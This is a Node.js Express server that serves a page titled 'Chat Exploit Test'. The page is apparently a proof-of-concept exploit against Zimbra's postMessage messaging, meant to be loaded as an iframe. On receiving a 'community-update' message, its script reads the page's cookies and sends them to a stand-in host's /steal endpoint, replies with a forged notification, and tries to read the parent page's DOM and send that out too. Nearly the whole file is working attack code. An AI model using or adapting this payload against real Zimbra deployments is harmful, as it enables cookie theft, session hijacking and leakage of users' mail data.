const express = require('express');
const http = require('http');

const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Chat Exploit Test</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; }
          #output { margin-top: 10px; }
        </style>
      </head>
      <body>
        <h1>Chat Exploit Test</h1>
        <div id="output">Waiting for messages from Zimbra...</div>
        <script>
          window.addEventListener('message', function(event) {
            console.log('Message received:', event.data, 'Origin:', event.origin);
            var output = document.getElementById('output');
            if (event.data === 'type=community-update') {
              output.innerHTML += '<p>Received community-update from ' + event.origin + '</p>';
              var cookies = document.cookie;
              console.log('Cookies:', cookies);
              fetch('https://your-test-server.com/steal?cookies=' + encodeURIComponent(cookies) + '&origin=' + event.origin, { mode: 'no-cors' });
              var fakeNotification = 'type=community-notification&unread=true';
              event.source.postMessage(fakeNotification, event.origin);
              console.log('Sent fake notification back');
              try {
                var parentContent = window.top.document.body.innerHTML;
                console.log('Parent DOM:', parentContent);
                fetch('https://your-test-server.com/steal?dom=' + encodeURIComponent(parentContent.slice(0, 100)), { mode: 'no-cors' });
              } catch (e) {
                console.error('DOM access blocked:', e);
              }
            } else {
              output.innerHTML += '<p>Received other message: ' + event.data + ' from ' + event.origin + '</p>';
            }
          }, false);

          window.parent.postMessage('Iframe loaded', '*');
          console.log('Iframe loaded, notified parent');
        </script>
      </body>
    </html>
  `);
});

const port = process.env.PORT || 4000;
server.listen(port, () => {
  console.log('Chat server running on port', port);
});